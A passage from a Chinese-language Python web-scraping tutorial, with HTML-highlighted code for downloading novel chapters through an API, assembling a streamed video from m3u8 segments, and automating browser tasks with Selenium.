punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>    tasks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> dic<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'novel'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'items'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        title <span class="token operator">=</span> i<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span>        cid <span class="token operator">=</span> i<span class="token punctuation">[</span><span class="token string">'cid'</span><span class="token punctuation">]</span>        tasks<span class="token punctuation">.</span>append<span class="token punctuation">(</span>asyncio<span class="token punctuation">.</span>create_task<span class="token punctuation">(</span>down<span class="token punctuation">(</span>cid<span class="token punctuation">,</span> bookid<span class="token punctuation">,</span> title<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> asyncio<span class="token punctuation">.</span>wait<span class="token punctuation">(</span>tasks<span class="token punctuation">)</span>    resp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    bookid <span class="token operator">=</span> <span class="token string">"4306063500"</span>    url <span class="token operator">=</span> <span class="token string">'https://dushu.baidu.com/api/pc/getCatalog?data=&#123;"book_id":"'</span><span class="token operator">+</span>bookid<span class="token operator">+</span><span class="token string">'"&#125;'</span>    asyncio<span class="token punctuation">.</span>get_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>run_until_complete<span class="token punctuation">(</span>getCatalog<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="抓取一部视频"><a href="#抓取一部视频" class="headerlink" title="抓取一部视频"></a>抓取一部视频</h2><blockquote><h4 id="找到m3u8"><a href="#找到m3u8" class="headerlink" title="找到m3u8"></a>找到m3u8</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">url <span class="token operator">=</span> <span class="token string">"https://91kanju.com/vod-play/54812-1-1.html"</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "</span>                  <span class="token string">"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.12 Safari/537.36"</span><span class="token punctuation">&#125;</span>resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>obj <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r"url: '(?P&lt;m3u8>.*?)',"</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>m3u8_url <span class="token operator">=</span> obj<span class="token punctuation">.</span>search<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token string">"m3u8"</span><span class="token punctuation">)</span>resp2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>m3u8_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"哲仁王后.m3u8"</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp2<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="通过m3u8下载ts文件"><a href="#通过m3u8下载ts文件" class="headerlink" title="通过m3u8下载ts文件"></a>通过m3u8下载ts文件</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">n <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"哲仁王后.m3u8"</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">"r"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>        line <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"#"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        resp3 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>line<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"video/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span></span><span class="token string">.ts"</span></span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">"wb"</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp3<span class="token punctuation">.</span>content<span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        resp3<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span></span><span class="token string">->ok"</span></span><span class="token punctuation">)</span>        n <span class="token operator">+=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="将ts文件拼接成视频"><a href="#将ts文件拼接成视频" class="headerlink" title="将ts文件拼接成视频"></a>将ts文件拼接成视频</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">all_ts <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'video/'</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'video/video.mp4'</span><span class="token punctuation">,</span> <span class="token string">'wb+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>all_ts<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'video/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">.ts'</span></span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> e<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>e<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="selenium模块"><a href="#selenium模块" class="headerlink" title="selenium模块"></a><code>selenium</code>模块</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver <span class="token keyword">import</span> Chrome<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>keys <span class="token keyword">import</span> Keys<span class="token keyword">import</span> timeweb <span class="token operator">=</span> Chrome<span class="token punctuation">(</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://www.lagou.com/"</span><span class="token punctuation">)</span><span class="token comment"># 点击全国</span>el <span class="token operator">=</span> web<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="changeCityBox"]/p[1]/a'</span><span class="token punctuation">)</span>el<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 如果点击全国之后，页面需要刷新，那么刷新的时候找不到输入框，也就导致输入Python的时候报错，所以加入延时</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># 找到输入框 -> 输入python -> 回车</span>web<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="search_input"]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span><span class="token string">"python"</span><span class="token punctuation">,</span> Keys<span class="token punctuation">.</span>ENTER<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>li_list <span class="token operator">=</span> web<span class="token punctuation">.</span>find_elements_by_xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="jobList"]/div[1]/div'</span><span class="token punctuation">)</span><span class="token keyword">for</span> li <span class="token keyword">in</span> li_list<span class="token punctuation">:</span>    job_name <span class="token operator">=</span> li<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'./div[1]/div[1]/div[1]/a'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    job_salary <span class="token operator">=</span> li<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'./div[1]/div[1]/div[2]/span'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    company <span class="token operator">=</span> li<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'./div[1]/div[2]/div[1]/a'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">print</span><span class="token punctuation">(</span>company<span class="token punctuation">,</span> job_name<span class="token punctuation">,</span> job_salary<span class="token punctuation">)</span>web<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="切换窗口方法1"><a href="#切换窗口方法1" class="headerlink" title="切换窗口方法1"></a>切换窗口方法1</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver <span class="token keyword">import</span> Chrome<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>keys <span class="token keyword">import</span> Keys<span class="token keyword">import</span> timeweb <span class="token operator">=</span> Chrome<span class="token punctuation">(</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://www.lagou.com/"</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="cboxClose"]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="search_input"]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span><span class="token string">"python"</span><span class="token punctuation">,</span> Keys<span class="token punctuation">.</span>ENTER<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="jobList"]/div[1]/div[3]/div[1]/div[1]/div[1]/a'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>switch_to<span class="token punctuation">.</span>window<span class="token punctuation">(</span>web<span class="token punctuation">.</span>window_handles<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>job_detail <span class="token operator">=</span> web<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="job_detail"]/dd[2]/div'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>job_detail<span class="token punctuation">)</span>web<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>switch_to<span class="token punctuation">.</span>window<span class="token punctuation">(</span>web<span class="token punctuation">.</span>window_handles<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="切换窗口方法2-用于含有iframe标签的页面"><a href="#切换窗口方法2-用于含有iframe标签的页面" class="headerlink" title="切换窗口方法2(用于含有iframe标签的页面)"></a>切换窗口方法2(用于含有iframe标签的页面)</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">web<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://91kanju.com/vod-play/541-1-1.html"</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>iframe <span class="token operator">=</span> web<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="player_iframe"]'</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>switch_to<span class="token punctuation">.</span>frame<span class="token punctuation">(</span>iframe<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>switch_to<span class="token punctuation">.</span>default_content<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="无头浏览器（即不显示出打开浏览器的过程，使其在后台运行）"><a href="#无头浏览器（即不显示出打开浏览器的过程，使其在后台运行）" class="headerlink" title="无头浏览器（即不显示出打开浏览器的过程，使其在后台运行）"></a>无头浏览器（即不显示出打开浏览器的过程，使其在后台运行）</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver <span class="token keyword">import</span> Chrome<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support<span class="token punctuation">.</span>select <span class="token keyword">import</span> Select<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>chrome<span class="token punctuation">.</span>options <span class="token keyword">import</span> Options<span class="token keyword">import</span> time<span class="token comment"># 无头配置</span>opt <span class="token operator">=</span> Options<span class="token punctuation">(</span><span class="token punctuation">)</span>opt<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--headless"</span><span class="token punctuation">)</span>opt<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--disable-gpu"</span><span class="token punctuation">)</span>web <span class="token operator">=</span> Chrome<span class="token punctuation">(</span>options<span class="token operator">=</span>opt<span class="token punctuation">)</span>web<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://www.endata.com.cn/BoxOffice/BO/Year/index.html"</span><span class="token punctuation">)</span><span class="token comment"># 下拉列表</span>sel_element <span class="token operator">=</span> web<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="OptionDate"]'</span><span class="token punctuation">)</span>sel <span class="token operator">=</span> Select<span class="token punctuation">(</span>sel_element<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sel<span class="token punctuation">.</span>options<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sel<span class="token punctuation">.</span>select_by_index<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    table <span class="token operator">=</span> web<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="TableList"]/table'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"========================="</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="当页面内容是通过js或者ajax请求获得的数据时，无法通过查看源代码获得数据，可通过web-page-source获得"><a href="#当页面内容是通过js或者ajax请求获得的数据时，无法通过查看源代码获得数据，可通过web-page-source获得" class="headerlink" title="当页面内容是通过js或者ajax请求获得的数据时，无法通过查看源代码获得数据，可通过web.page_source获得"></a>当页面内容是通过js或者ajax请求获得的数据时，无法通过查看源代码获得数据，可通过<code>web.page_source</code>获得</h5><h4 id="定位元素方式总结"><a href="#定位元素方式总结" class="headerlink" title="定位元素方式总结"></a>定位元素方式总结</h4><ol><li><p>```python<br>inputForm = web.find_element_by_id(‘kw’)<br>inputForm.send_keys(‘python’)</p><pre class="line-numbers language-none"><code class="language-none">2. &#96;&#96;&#96;python   inputForm &#x3D; web.find_element_by_name(&#39;wd&#39;)   inputForm.send_keys(&#39;python&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>```python<br>inputForm = web.find_element_by_class_name(‘cls’)<br>inputForm.send_keys(‘python’)</p><pre class="line-numbers language-none"><code class="language-none">4. &#96;&#96;&#96;python   inputForm &#x3D; web.find_element_by_xpath(&quot;&#x2F;&#x2F;input[@id&#x3D;&#39;kw&#39;]&quot;)   inputForm.send_keys(&#39;python&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>```python<br>inputForm = web.find_element_by_css_selector(“.quickdelete-wrap &gt; input”)<br>inputForm.send_keys(‘python’)</p><pre class="line-numbers language-none"><code class="language-none">&gt; &#96;find_element&#96; 获取第一个满足条件的元素，&#96;find_elements&#96;获取满足所有条件的元素#### 操作表单元素1. 操作输入框   &#96;&#96;&#96;python   inputForm &#x3D; web.find_element_by_id(&quot;kw&quot;)   inputForm.send_keys(&#39;python&#39;)   time.sleep(5)   # 清楚输入框内容   inputForm.clear()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>操作checkbox</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">checkbox <span class="token operator">=</span> web<span class="token punctuation">.</span>find_element_by_name<span class="token punctuation">(</span><span class="token string">"Fruit"</span><span class="token punctuation">)</span>checkbox<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>操作select</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support<span class="token punctuation">.</span>ui <span class="token keyword">import</span> Selectweb<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://code.ciaoca.com/jquery/cxSelect/demo/api"</span><span class="token punctuation">)</span>selectButton <span class="token operator">=</span> Select<span class="token punctuation">(</span>web<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="city_china"]/dl[1]/dd/select[1]'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>selectButton<span class="token punctuation">.</span>select_by_index<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>selectButton<span class="token punctuation">.</span>select_by_value<span class="token punctuation">(</span><span class="token string">"内蒙古自治区"</span><span class="token punctuation">)</span>selectButton<span class="token punctuation">.</span>select_by_visible_text<span class="token punctuation">(</span><span class="token string">"吉林省"</span><span class="token punctuation">)</span>selectButton<span class="token punctuation">.</span>deselect_all<span class="token punctuation">(</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>操作Button</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">web<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://www.baidu.com/"</span><span class="token punctuation">)</span>inputForm <span class="token operator">=</span> web<span class="token punctuation">.</span>find_element_by_id<span class="token punctuation">(</span><span class="token string">'kw'</span><span class="token punctuation">)</span>inputForm<span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span><span class="token string">'python'</span><span class="token punctuation">)</span>submitButton <span class="token operator">=</span> web<span class="token punctuation">.</span>find_element_by_id<span class="token punctuation">(</span><span class="token string">'su'</span><span class="token punctuation">)</span>submitButton<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="行为链"><a href="#行为链" class="headerlink" title="行为链"></a>行为链</h4><p>页面操作分为多步，可以使用鼠标行为链类<code>ActionChains</code>完成</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>action_chains <span class="token keyword">import</span> ActionChainsweb<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://www.baidu.com/"</span><span class="token punctuation">)</span>inputForm <span class="token operator">=</span> web<span class="token punctuation">.</span>find_element_by_id<span class="token punctuation">(</span><span class="token string">'kw'</span><span class="token punctuation">)</span>submitButton <span class="token operator">=</span> web<span class="token punctuation">.</span>find_element_by_id<span class="token punctuation">(</span><span class="token string">'su'</span><span class="token punctuation">)</span>actions <span class="token operator">=</span> ActionChains<span class="token punctuation">(</span>web<span class="token punctuation">)</span>actions<span class="token punctuation">.</span>move_to_element<span class="token punctuation">(</span>inputForm<span class="token punctuation">)</span>actions<span class="token punctuation">.</span>send_keys_to_element<span class="token punctuation">(</span>inputForm<span class="token punctuation">,</span><span class="token string">'python'</span><span class="token punctuation">)</span>actions<span class="token punctuation">.</span>move_to_element<span class="token punctuation">(</span>submitButton<span class="token punctuation">)</span>actions<span class="token punctuation">.</span>click<span class="token punctuation">(</span>submitButton<span class="token punctuation">)</span>actions<span class="token punctuation">.</span>perform<span class="token punctuation">(</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>更多操作</p><ul><li>click_and_hold(element) 点击但不松开鼠标</li><li>context_click(element) 右键点击</li><li>double_click(element) 双击</li></ul><p>更多方法参考 <a href="https://selenium-python.readthedocs.io/api.html">https://selenium-python.readthedocs.io/api.html</a></p></blockquote><h4 id="操作cookie"><a href="#操作cookie" class="headerlink" title="操作cookie"></a>操作cookie</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 获取所有cookie</span><span class="token keyword">for</span> cookie <span class="token keyword">in</span> web<span class="token punctuation">.</span>get_cookies<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token comment"># 针对某个key获取value</span><span class="token keyword">print</span><span class="token punctuation">(</span>web<span class="token punctuation">.</span>get_cookie<span class="token punctuation">(</span><span class="token string">"PSTM"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 删除某个key对应的cookie</span>web<span class="token punctuation">.</span>delete_cookie<span class="token punctuation">(</span><span class="token string">"PSTM"</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>delete_all_cookies<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="页面等待"><a href="#页面等待" class="headerlink" title="页面等待"></a>页面等待</h4><p>隐式等待 - 调用<code>implicitly_wait</code>，在获取不可用的元素之前，会先等待一些时间</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">web<span class="token punctuation">.</span>implicitly_wait<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://www.baidu.com/"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>显式等待 - 表明某个条件成立后才执行获取元素的操作，也可以在等待中指定一个最大的时间，如果超过这个时间，就会抛出异常。使用<code>selenium.webdriver.support.ui.WebDriverWait</code> 和 <code>selenium.webdriver.support.expected_conditions</code>配合完成</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>by <span class="token keyword">import</span> By<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support<span class="token punctuation">.</span>ui <span class="token keyword">import</span> WebDriverWait<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support <span class="token keyword">import</span> expected_conditions<span class="token keyword">try</span><span class="token punctuation">:</span>    element <span class="token operator">=</span> WebDriverWait<span class="token punctuation">(</span>web<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>until<span class="token punctuation">(</span>expected_conditions<span class="token punctuation">.</span>presence_of_element_located<span class="token punctuation">(</span><span class="token punctuation">(</span>By<span class="token punctuation">.</span>ID<span class="token punctuation">,</span> <span class="token string">"myelement"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">finally</span><span class="token punctuation">:</span>    web<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="切换页面"><a href="#切换页面" class="headerlink" title="切换页面"></a>切换页面</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">web<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://www.baidu.com/"</span><span class="token punctuation">)</span><span class="token comment"># 调用js语法打开新的页面</span>web<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string">"window.open('https://www.douban.com/')"</span><span class="token punctuation">)</span><span class="token comment"># 切换到该页面中</span>web<span class="token punctuation">.</span>switch_to<span class="token punctuation">.</span>window<span class="token punctuation">(</span>web<span class="token punctuation">.</span>window_handles<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>web<span class="token punctuation">.</span>current_url<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token 